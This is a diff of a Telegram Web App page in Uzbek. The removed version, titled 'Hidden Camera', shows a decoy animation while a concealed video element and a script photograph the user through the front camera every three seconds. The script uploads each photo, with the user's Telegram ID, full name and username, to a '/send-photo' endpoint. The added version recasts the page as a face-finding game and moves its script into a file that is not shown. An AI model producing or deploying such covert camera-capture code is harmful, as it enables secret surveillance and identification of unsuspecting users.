@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Yashirin Kamera</title>
+  <title>Yuzni Topish O'yini</title>
   <style>
     body {
       font-family: sans-serif;
@@ -20,111 +20,97 @@
       padding: 1rem;
       background: #1d1d1d;
       border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 170, 255, 0.2);
     }
 
-    .circle {
-      width: 40px;
-      height: 40px;
-      background: #0af;
+    .target {
+      width: 60px;
+      height: 60px;
+      background: radial-gradient(circle, rgba(0,170,255,0.8) 0%, rgba(0,170,255,0) 70%);
       border-radius: 50%;
       position: absolute;
-      top: 0;
-      left: 0;
-      animation: moveCircle 3s infinite;
+      pointer-events: none;
+      transition: transform 0.1s;
     }
 
-    @keyframes moveCircle {
-      0% { top: 0; left: 0; }
-      25% { top: 0; left: 80%; }
-      50% { top: 80%; left: 80%; }
-      75% { top: 80%; left: 0; }
-      100% { top: 0; left: 0; }
+    .game-area {
+      position: relative;
+      height: 300px;
+      background: #222;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 1rem 0;
+    }
+
+    .score-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 1rem 0;
+    }
+
+    .score {
+      background: #333;
+      padding: 0.5rem 1rem;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+
+    .timer {
+      color: #0af;
+      font-size: 1.2rem;
+      font-weight: bold;
+      margin: 1rem 0;
+    }
+
+    button {
+      background: #0af;
+      color: white;
+      border: none;
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #09c;
+    }
+
+    .hidden {
+      display: none;
     }
 
     video {
-      display: none !important;
-      width: 0;
-      height: 0;
-      opacity: 0;
-    }
-
-    .loader {
-      border: 5px solid #333;
-      border-top: 5px solid #0af;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 2rem auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="game">
-    <h2>Yuzni aniqlash boshlangan</h2>
-    <p>Iltimos, sahifani tark etmang</p>
-    <div class="loader"></div>
-    <div style="position: relative; height: 200px; background: #222; border-radius: 10px;">
-      <div class="circle"></div>
+    <h1>Yuzni Topish O'yini</h1>
+    <p>O'yin davomida kamerangiz ishlatiladi. Targetga tegib ball to'plang!</p>
+    
+    <div class="game-area" id="gameArea">
+      <div class="target" id="target"></div>
+    </div>
+    
+    <div class="score-container">
+      <div class="score">Ball: <span id="score">0</span></div>
+      <div class="score">Rekord: <span id="highScore">0</span></div>
+    </div>
+    
+    <div class="timer" id="timer">60</div>
+    
+    <button id="startBtn">O'yinni Boshlash</button>
+    <div id="loading" class="hidden">
+      <p>Kamera sozlanmoqda...</p>
     </div>
   </div>
 
   <video id="video" autoplay playsinline muted></video>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script>
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-
-    const user = Telegram.WebApp.initDataUnsafe?.user;
-    const userId = user?.id || "";
-    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
-    const username = user?.username || "";
-
-    const video = document.getElementById("video");
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
-
-    (async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, audio: false
-        });
-
-        video.srcObject = stream;
-        await video.play();
-
-        setInterval(async () => {
-          if (!video.videoWidth) return;
-
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
-          const file = new File([blob], "photo.png", { type: "image/png" });
-
-          const formData = new FormData();
-          formData.append("photo", file);
-          formData.append("user_id", userId);
-          formData.append("tg_fullname", fullName);
-          formData.append("tg_username", username);
-
-          await fetch("/send-photo", {
-            method: "POST",
-            body: formData
-          });
-          console.log("✅ Yuborildi", new Date().toLocaleTimeString());
-        }, 3000);
-      } catch (err) {
-        console.error("❌ Kamera ishlamadi:", err.message);
-      }
-    })();
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
